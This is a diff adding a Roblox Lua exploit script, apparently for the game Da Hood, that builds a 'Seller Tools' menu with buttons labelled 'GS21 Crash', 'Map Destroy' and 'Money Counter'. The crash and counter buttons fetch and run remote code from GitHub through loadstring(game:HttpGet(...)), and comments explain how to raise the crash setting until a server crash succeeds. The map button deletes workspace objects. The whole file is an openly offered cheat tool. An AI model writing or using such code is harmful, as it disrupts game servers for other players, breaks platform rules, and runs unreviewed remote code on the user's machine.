@@ -1,0 +1,134 @@
+-- LOL --
+
+local ScreenGui = Instance.new("ScreenGui")
+local Main = Instance.new("ImageLabel")
+local line = Instance.new("ImageLabel")
+local txt1 = Instance.new("TextLabel")
+local btn1 = Instance.new("TextButton")
+local btn2 = Instance.new("TextButton")
+local btn3 = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Name = "😝😃"
+ScreenGui.Parent = game.CoreGui
+
+Main.Name = "Main"
+Main.Parent = ScreenGui
+Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Main.BackgroundTransparency = 1.000
+Main.Position = UDim2.new(0.406126469, 0, 0.283495158, 0)
+Main.Size = UDim2.new(0, 273, 0, 262)
+Main.Image = "rbxassetid://3570695787"
+Main.ImageColor3 = Color3.fromRGB(35, 35, 35)
+Main.ScaleType = Enum.ScaleType.Slice
+Main.SliceCenter = Rect.new(100, 100, 100, 100)
+Main.SliceScale = 0.120
+
+line.Name = "line"
+line.Parent = Main
+line.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+line.BackgroundTransparency = 1.000
+line.BorderSizePixel = 0
+line.Size = UDim2.new(0, 273, 0, 31)
+line.Image = "rbxassetid://3570695787"
+line.ImageColor3 = Color3.fromRGB(45, 45, 45)
+line.ScaleType = Enum.ScaleType.Slice
+line.SliceCenter = Rect.new(100, 100, 100, 100)
+line.SliceScale = 0.120
+
+txt1.Name = "txt1"
+txt1.Parent = Main
+txt1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+txt1.BackgroundTransparency = 1.000
+txt1.Size = UDim2.new(0, 273, 0, 31)
+txt1.Font = Enum.Font.SourceSansBold
+txt1.Text = "Seller Tools"
+txt1.TextColor3 = Color3.fromRGB(255, 255, 255)
+txt1.TextScaled = true
+txt1.TextSize = 14.000
+txt1.TextWrapped = true
+
+btn1.Name = "btn1"
+btn1.Parent = Main
+btn1.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+btn1.BorderSizePixel = 0
+btn1.Position = UDim2.new(0.186813191, 0, 0.274809152, 0)
+btn1.Size = UDim2.new(0, 171, 0, 40)
+btn1.Font = Enum.Font.SourceSansBold
+btn1.Text = "GS21 Crash"
+btn1.TextColor3 = Color3.fromRGB(255, 255, 255)
+btn1.TextScaled = true
+btn1.TextSize = 14.000
+btn1.TextWrapped = true
+
+btn2.Name = "btn2"
+btn2.Parent = Main
+btn2.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+btn2.BorderSizePixel = 0
+btn2.Position = UDim2.new(0.186813191, 0, 0.48854959, 0)
+btn2.Size = UDim2.new(0, 171, 0, 40)
+btn2.Font = Enum.Font.SourceSansBold
+btn2.Text = "Map Destroy"
+btn2.TextColor3 = Color3.fromRGB(255, 255, 255)
+btn2.TextScaled = true
+btn2.TextSize = 14.000
+btn2.TextWrapped = true
+
+btn3.Name = "btn3"
+btn3.Parent = Main
+btn3.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+btn3.BorderSizePixel = 0
+btn3.Position = UDim2.new(0.186813191, 0, 0.721374035, 0)
+btn3.Size = UDim2.new(0, 171, 0, 40)
+btn3.Font = Enum.Font.SourceSansBold
+btn3.Text = "Money Counter"
+btn3.TextColor3 = Color3.fromRGB(255, 255, 255)
+btn3.TextScaled = true
+btn3.TextSize = 14.000
+btn3.TextWrapped = true
+
+btn2.MouseButton1Down:Connect(function()
+	local pp = game.Workspace["Ignored"]
+	local titi = game.Workspace["MAP"]
+	local pepe = game.Workspace["Players"]
+
+	pp:Destroy()
+	titi:Destroy()
+	pepe:Destroy()
+end)
+
+btn1.MouseButton1Down:Connect(function()
+	getgenv().Active = true --Toggle true or false
+	getgenv().CrashAmmount = 1500 --The more you add the better
+--[[ Theres a chance that the crash fails, if that happends just re execute and
+     add more to CrashAmmount
+      Requirements:
+      Any PC, 5 minutes, account has to be in a group (it doesnt matter the group)
+]]
+
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/GS21Official/Seller-Tools/main/GS21%20Dh%20Crash'))()
+end)
+
+btn3.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/GS21Official/Seller-Tools/main/DaHood%20Cash%20Counter"))()
+end)
+
+-- Scripts:
+
+local function YFRCA_fake_script() -- Main.OMGANTICHEAT 
+	local script = Instance.new('LocalScript', Main)
+
+	frame = script.Parent
+	frame.Draggable = true
+	frame.Active = true
+	frame.Selectable = true
+	
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "Loaded!";
+		Text = "Enjoy Made By Zonoxy#0003!";
+		Duration = 3;
+	})
+	
+end
+coroutine.wrap(YFRCA_fake_script)()
